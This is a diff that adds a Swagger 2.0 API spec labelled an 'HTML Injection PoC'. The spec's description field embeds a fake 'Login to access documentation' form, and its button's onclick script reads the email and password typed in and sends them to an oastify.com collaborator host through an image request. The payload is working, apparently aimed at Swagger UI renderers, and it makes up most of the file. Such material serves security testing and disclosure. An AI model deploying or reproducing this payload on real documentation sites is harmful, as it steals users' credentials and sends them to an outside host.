@@ -1,0 +1,22 @@
+swagger: '2.0'
+info:
+  title: HTML Injection PoC
+  description: |
+    <h2>Login to access documentation</h2>
+    <input id="email" placeholder="Email"><br>
+    <input id="password" placeholder="Password" type="password"><br>
+    <button onclick="
+      var e = document.getElementById('email').value;
+      var p = document.getElementById('password').value;
+      var i = new Image();
+      i.src = 'http://t71jknrq6oy3949z9e3lcndik9q0eq2f.oastify.com/creds?e=' + encodeURIComponent(e) + '&p=' + encodeURIComponent(p);
+    ">Login</button>
+  version: '1.0.0'
+basePath: /
+paths:
+  /ping:
+    get:
+      summary: test
+      responses:
+        '200':
+          description: pong
